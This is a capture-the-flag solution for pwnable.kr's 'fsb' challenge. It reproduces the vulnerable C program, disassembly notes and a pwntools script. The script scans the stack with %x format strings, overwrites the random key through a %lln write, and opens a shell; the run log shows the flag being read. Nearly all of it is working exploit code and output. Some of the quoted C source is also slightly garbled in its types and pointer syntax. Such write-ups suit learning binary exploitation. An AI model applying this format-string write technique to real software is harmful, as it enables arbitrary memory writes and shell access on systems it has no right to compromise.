'''
Description:

    Isn't FSB almost obsolete in computer security?
    Anyway, have fun with it :)
    
    ssh fsb@pwnable.kr -p2222 (pw:guest)

Source of fsb.c:

    #include <stdio.h>
    #include <alloca.h>
    #include <fcntl.h>

    unsigned long long key;
    char buf[100];
    char buf2[100];

    int fsb(char argv, char envp){
        char* args[]={"/bin/sh", 0};
        int i;
        char*** pargv = &argv;
        char*** penvp = &envp;
        char** arg;
        char* c;
        for(arg=argv;*arg;arg++) for(c=*arg; c;c++) c='\0';
        for(arg=envp;*arg;arg++) for(c=*arg; c;c++) c='\0';
        *pargv=0;
        *penvp=0;

        for(i=0; i<4; i++){
            printf("Give me some format strings(%d)\n", i+1);
            read(0, buf, 100);
            printf(buf);
        }
        
        printf("Wait a sec...\n");
        sleep(3);

        printf("key : \n");
        read(0, buf2, 100);
        unsigned long long pw = strtoull(buf2, 0, 10);

        if(pw == key){
            printf("Congratz!\n");
            execve(args[0], args, 0);
            return 0;
        }
        
        printf("Incorrect key \n");
        return 0;
    }
    
    int main(int argc, char argv[], char* envp){
    
        int fd = open("/dev/urandom", O_RDONLY);

        if( fd==-1 || read(fd, &key, 8) != 8 ){
            printf("Error, tell admin\n");
            return 0;
        }
        
        close(fd);
        alloca(0x12345 & key);
        fsb(argv, envp); // exploit this format string bug!
        return 0;
    }
    
Solution

    pw  = 0x804a080 (buf2, size 100)
    key = 0x804a060     8 bytes
    buf = 0x804a100 (size 100)
    0x80488ae = "Congratz!"
    
    check:

    0x08048676 <+322>:   call   0x8048460 <strtoull@plt>    0x4141414142424242 4702111234491826754
    0x0804867b <+327>:   mov    edx,eax
    0x0804867d <+329>:   sar    edx,0x1f
    0x08048680 <+332>:   mov    DWORD PTR [ebp-0x30],eax     low 4 byte 0x42424242
    0x08048683 <+335>:   mov    DWORD PTR [ebp-0x2c],edx
    0x08048686 <+338>:   mov    eax,ds:0x804a060
    0x0804868b <+343>:   mov    edx,DWORD PTR ds:0x804a064
    0x08048691 <+349>:   mov    ecx,edx
    0x08048693 <+351>:   xor    ecx,DWORD PTR [ebp-0x2c]
    0x08048696 <+354>:   xor    eax,DWORD PTR [ebp-0x30]
    0x08048699 <+357>:   or     eax,ecx
    0x0804869b <+359>:   test   eax,eax
    0x0804869d <+361>:   jne    0x80486cc <fsb+408>

Solver:
'''

from pwn  import *
from time import sleep

user    = 'fsb'
passwd  = 'guest'
host    = 'pwnable.kr'
port    = 2222
command = '''
cd /tmp; echo "
from pwn  import process
from time import sleep

addr_of_key = '804a060'
offset_in_the_stack = 15
format_of_string = lambda x : ' '.join('%{}\$x'.format(i) for i in range(x, x+16))

while True:
    p = process('/home/fsb/fsb')
    p.recvuntil('\\n')
    p.sendline(format_of_string(offset_in_the_stack))
    sleep(0.1)
    answer = p.recvuntil('\\n')
    answer = answer[0: answer.find('Give me')].split(' ')
    try:
        position = answer.index(addr_of_key)
        box_in_the_stack = offset_in_the_stack + position
        print '[+] Find position, number', box_in_the_stack
        p.sendline('%{}\$x'.format(box_in_the_stack))
        sleep(0.1)
        p.recvuntil('\\n')
        p.sendline('%{}\$x'.format(box_in_the_stack))
        sleep(0.1)
        p.recvuntil('\\n')
        p.sendline('%{}c%{}\$lln'.format(0, box_in_the_stack))
        print '[+] Key has been changed\\n[+] Key equals one'
        sleep(0.1)
        p.recvuntil('\\n')
        p.clean()
        sleep(3)
        p.interactive()
        p.close()
        break
    except ValueError:
        p.close()
" > fsb.py; cat fsb.py;
'''

s = ssh(user, host, port, passwd)
s.run_to_end(command)
s.interactive()
s.close()

'''
Log:

[+] Connecting to pwnable.kr on port 2222: Done
[+] Opening new channel: None: Done
[*] Switching to interactive mode
fsb@ubuntu:~$ python /tmp/fsb.py
[+] Starting program '/home/fsb/fsb': Done
[*] Stopped program '/home/fsb/fsb'
[+] Starting program '/home/fsb/fsb': Done
[*] Stopped program '/home/fsb/fsb'
[+] Starting program '/home/fsb/fsb': Done
[*] Stopped program '/home/fsb/fsb'
[+] Starting program '/home/fsb/fsb': Done
[*] Stopped program '/home/fsb/fsb'
[+] Starting program '/home/fsb/fsb': Done
[*] Stopped program '/home/fsb/fsb'
[+] Starting program '/home/fsb/fsb': Done
[*] Stopped program '/home/fsb/fsb'
[+] Starting program '/home/fsb/fsb': Done
[*] Stopped program '/home/fsb/fsb'
[+] Starting program '/home/fsb/fsb': Done
[*] Stopped program '/home/fsb/fsb'
[+] Starting program '/home/fsb/fsb': Done
[+] Find position, number 25
[+] Key has been changed
[+] Key equals one
[*] Switching to interactive mode
key : 
$ 1
Congratz!
$ cat flag
Have you ever saw an example of utilizing [n] format character?? :(
$ 
[*] Interrupted
[*] Stopped program '/home/fsb/fsb'
fsb@ubuntu:~$ exit
logout
[*] Got EOF while reading in interactive
[*] Closed SSH channel with pwnable.kr
[*] Closed connection to 'pwnable.kr'
'''

